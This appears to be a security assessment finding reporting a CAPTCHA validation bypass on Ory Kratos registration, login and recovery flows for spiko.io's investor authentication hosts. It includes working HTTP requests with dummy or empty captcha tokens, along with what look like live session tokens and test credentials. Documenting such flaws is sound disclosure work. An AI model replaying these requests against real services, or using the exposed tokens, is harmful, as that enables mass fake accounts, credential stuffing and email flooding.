# F018 - CAPTCHA Validation Bypass on All Ory Kratos Flows

## Summary

| Field | Value |
|-------|-------|
| Severity | High |
| CVSS 3.1 | 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L) |
| OWASP | A07:2021 - Identification and Authentication Failures |
| Endpoint | `POST https://investor-auth.spiko.io/self-service/registration` |
| Also Affects | `/self-service/login`, `/self-service/recovery` on investor-auth.spiko.io and investor-auth.staging.spiko.io |
| Status | Confirmed |

## Description

Server-side CAPTCHA validation on Ory Kratos is non-functional. The server checks for the *presence* of a `transient_payload.captcha_token` field but does not validate the token against any CAPTCHA provider. Any non-empty string (including an empty string `""`) is accepted. Only a completely absent field triggers a rejection.

The SPA configures reCAPTCHA v3 client-side (`captcha: "recaptcha-v3"` with site key `6Le1rdQrAAAAAC7cAtIT1TQ2i9fY8dsQczdA5l3V`), but the Ory Kratos server never validates the submitted token against Google's verification API.

## Impact

- Unlimited automated account creation without CAPTCHA barrier
- Brute-force password attacks (login rate-limited at 20/s but no CAPTCHA)
- Password reset email flooding via recovery flow
- Automated credential stuffing campaigns
- Combined with F003: automated email enumeration at scale

## Proof

### Registration with dummy captcha token

**Request:**
```http
POST /self-service/registration?flow=b3cbe7f8-f57a-49c7-a947-3037458d2931 HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json
Accept: application/json

{
  "method": "password",
  "password": "TestP@ssw0rd2026!",
  "transient_payload": {"captcha_token": "dummy_token_test"},
  "traits": {
    "first_name": "Test",
    "last_name": "User1",
    "email": "spiko.test.alpha.29oct@proton.me",
    "preferences": {"locale": "en", "investorAppMode": "standard"}
  }
}
```

**Response (200 OK):**
```json
{
  "session": {
    "active": true,
    "identity": {
      "id": "45b3fa1e-250a-4e43-95f3-1a5a18e689dc",
      "state": "active",
      "traits": {"email": "spiko.test.alpha.29oct@proton.me"}
    },
    "authenticator_assurance_level": "aal1"
  },
  "session_token": "ory_st_5qII5CT1SDGImcGPj8uOgFC00QjOIDqX"
}
```

### Registration with empty string captcha token

**Request:**
```http
POST /self-service/registration?flow=<flow_id> HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json

{"method":"password","password":"TestP@ssw0rd2026!",
 "transient_payload":{"captcha_token":""},
 "traits":{"first_name":"Empty","last_name":"Captcha",
           "email":"spiko.emptycaptcha.29oct@proton.me",
           "preferences":{"locale":"en","investorAppMode":"standard"}}}
```

**Response:** 200 OK, active session created.

### Login with dummy captcha token

**Request:**
```http
POST /self-service/login?flow=<flow_id> HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json

{"method":"password","identifier":"spiko.test.alpha.29oct@proton.me",
 "password":"TestP@ssw0rd2026!",
 "transient_payload":{"captcha_token":"dummy"}}
```

**Response:** 200 OK, `session_token: ory_st_tQOX6dg1mbDAPUtaDUCz0aYHOZGOB1po`

### Recovery with dummy captcha token

**Request:**
```http
POST /self-service/recovery?flow=<flow_id> HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json

{"method":"code","email":"spiko.test.alpha.29oct@proton.me",
 "transient_payload":{"captcha_token":"dummy"}}
```

**Response:** 200 OK, `state: "sent_email"` -- recovery code email sent.

### Staging environment confirmation

Same bypass confirmed on `investor-auth.staging.spiko.io` -- registered account with Identity ID `5845bae5-119c-4eba-b596-a0c9fbb89465`.
